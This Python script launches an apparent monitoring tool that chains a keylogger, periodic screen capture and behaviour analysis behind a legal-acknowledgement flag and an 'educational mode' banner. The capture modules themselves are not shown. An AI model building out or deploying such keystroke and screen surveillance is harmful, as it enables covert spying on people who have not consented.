import argparse
from ethics.legal import LegalConstraints
from core.keylogger import Keylogger
from core.screenshot import ScreenMonitor
from analytics.behavioral import BehaviorAnalyzer

class AdvancedMonitoringSystem:
    def __init__(self):
        self.legal = LegalConstraints()
        self.keylogger = Keylogger()
        self.screen_monitor = ScreenMonitor()
        self.analyzer = BehaviorAnalyzer()
        
    def run(self):
        self.legal.display_and_verify()
        print("""
        Running in EDUCATIONAL MODE
        Features enabled:
        - Keystroke pattern analysis
        - Screen monitoring (5 min intervals)
        - Encrypted data storage
        """)
        
        try:
            self.keylogger.run()
        except KeyboardInterrupt:
            print("\nMonitoring stopped by user")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--legal-acknowledge', action='store_true',
                      help='Acknowledge legal terms')
    args = parser.parse_args()
    
    if not args.legal_acknowledge:
        print("You must acknowledge the legal terms to run this software")
        exit(1)
        
    monitor = AdvancedMonitoringSystem()
    monitor.run()
